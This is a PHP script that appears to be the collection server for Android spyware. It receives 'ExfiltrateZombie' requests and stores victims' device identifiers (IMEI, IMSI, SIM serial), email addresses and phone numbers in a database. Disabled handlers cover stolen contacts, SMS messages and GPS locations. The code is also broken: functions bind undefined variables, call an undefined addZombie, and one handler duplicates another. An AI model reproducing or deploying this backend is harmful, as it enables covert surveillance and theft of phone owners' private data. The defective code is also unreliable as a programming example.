#    Copyright (C) 2015 Alexandre Teyar

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License. 

<?php
	$host = "localhost";
	$username = "";
	$password = "";
	$db = "SCI";

	$mysqli = mysqli_connect($host, $username, $password, $db);
	$mysqli->set_charset('utf8');

	if (!$mysqli) {
		die("Failed to connect to MySQL: ".mysqli_connect_error());
	}

	if (!empty($_POST['action']) && !empty($_POST['data'])) {
		$action	= urldecode($_POST['action']);
		$data 	= json_decode(urldecode($_POST['data']), true);

		switch ($action) {
            case "ExfiltrateZombie":
                insertZombie($mysqli, $data);
                break;

            // case "ExfiltrateContact":
            //     insertContact($mysqli, $data);
            //     break;

            // case "ExfiltrateSMS":
            //     insertSMS($mysqli, $data);
            //     break;

            // case "Tracker":
            //     insertPosition($mysqli, $data);
            //     break;

            default:
                http_response_code(400);
                break;
        }
	}	

	function insertZombie($mysqli, $email, $tel) {	
		$statement = $mysqli->prepare("INSERT INTO Zombie (email_addresses, number, simSerial, MCC_MNC, IMSI, IMEI, deviceSerial, manufacturer, model, release) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
		$statement->bind_param(
			"ssssssssss", 
			$email_addresses, 
			$number, 
			$simSerial, 
			$MCC_MNC, 
			$IMSI, 
			$IMEI, 
			$deviceSerial, 
			$manufacturer, 
			$model, 
			$release
		);
		$result = $statement->execute();

		if(!$result) {
			echo "INSERT INTO Zombie: ".$statement->error;	
		}

		$statement->close();
	}

	function insertContact($mysqli, $SMSArray) {
		$first = true;
		$statement = $mysqli->prepare("INSERT INTO SMS (idS, thread, email, tel, otherTel, otherName, content, date, type)
			VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)");

		foreach ($SMSArray as $SMS) {
			extract($SMS);

			if($first) {
				addZombie($mysqli, $email, $tel);
				$first = false;
			}

			$statement->bind_param("iissssssi", $idS, $thread, $email, $tel, $otherTel, $otherName, $content, $date, $type);
			$result = $statement->execute();
			
			if(!$result) {
				header($_SERVER['SERVER_PROTOCOL'] . "500 Internal Server Error", true, 500);
				echo "INSERT INTO SMS: ".$statement->error;	
			}
		}

		$statement->close();
	}

	function insertSMS($mysqli, $SMSArray) {
		$first = true;
		$statement = $mysqli->prepare("INSERT INTO SMS (idS, thread, email, tel, otherTel, otherName, content, date, type)
			VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)");

		foreach ($SMSArray as $SMS) {
			extract($SMS);

			if($first) {
				addZombie($mysqli, $email, $tel);
				$first = false;
			}

			$statement->bind_param("iissssssi", $idS, $thread, $email, $tel, $otherTel, $otherName, $content, $date, $type);
			$result = $statement->execute();
			
			if(!$result) {
				header($_SERVER['SERVER_PROTOCOL'] . "500 Internal Server Error", true, 500);
				echo "INSERT INTO SMS: ".$statement->error;	
			}
		}

		$statement->close();
	} 

	function insertPosition($mysqli, $GPSTracker) {
		extract($GPSTracker);
		
		addZombie($mysqli, $email, $tel);

		$statement = $mysqli->prepare("INSERT INTO Position (email, tel, address, longitude, latitude, altitude, accuracy, date, provider)
			VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)");

		$statement->bind_param("sssddddss", $email, $tel, $address, $longitude, $latitude, $altitude, $accuracy, $date, $provider);
		$result = $statement->execute();


		if(!$result) {
			header($_SERVER['SERVER_PROTOCOL'] . "500 Internal Server Error", true, 500);
			die("INSERT INTO Position: ".$statement->error);	
		}

		$statement->close();
	}	

	mysqli_close($mysqli);
?>
